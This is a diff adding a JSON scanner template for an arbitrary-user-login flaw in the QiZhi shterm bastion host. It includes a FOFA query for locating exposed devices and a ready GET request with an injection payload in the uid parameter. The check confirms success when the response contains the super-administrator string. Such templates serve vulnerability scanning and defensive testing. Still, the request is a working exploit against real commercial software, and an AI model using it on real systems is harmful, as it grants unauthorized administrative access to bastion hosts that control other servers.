@@ -1,0 +1,57 @@
+{
+  "Name": "shterm(QiZhi) fortress Arbitrary user login",
+  "Description": "Qizhi fortress machine any user login vulnerability",
+  "Product": "QiZhi",
+  "Homepage": "https://www.qzsec.com/",
+  "DisclosureDate": "2021-04-08",
+  "Author": "go0p",
+  "FofaQuery": "app=\"齐治科技-堡垒机\" || product=\"shterm-Fortres-Machine\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "超级管理员",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["Arbitrary user login"],
+  "CVEIDs": null,
+  "CVSSScore": "9.3",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["shterm-Fortres-Machine"]
+  }
+}
